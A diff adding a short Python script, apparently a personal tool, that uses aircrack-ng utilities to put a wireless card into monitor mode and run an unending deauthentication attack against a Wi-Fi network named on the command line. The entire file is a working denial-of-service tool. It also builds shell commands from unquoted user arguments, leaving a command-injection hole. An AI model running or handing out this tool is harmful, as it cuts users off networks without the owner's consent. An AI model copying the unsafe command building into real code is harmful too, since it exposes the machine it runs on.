@@ -1,0 +1,12 @@
+#!/bin/python3
+import os
+import sys
+usage = "Usage: deauth <\"ESSID\"> <Channel>"
+if (len(sys.argv)!=3):
+	print (usage)
+	print (len(sys.argv))
+	sys.exit()
+print("[+] Starting Wireless Interface In Monitor Mode!")
+os.system("sudo airmon-ng check kill > tmp")
+os.system("sudo airmon-ng start wlan0 > tmp")
+os.system("sudo iwconfig wlan0mon channel "+sys.argv[2]+";sudo aireplay-ng -0 0 -e "+sys.argv[1]+" wlan0mon")
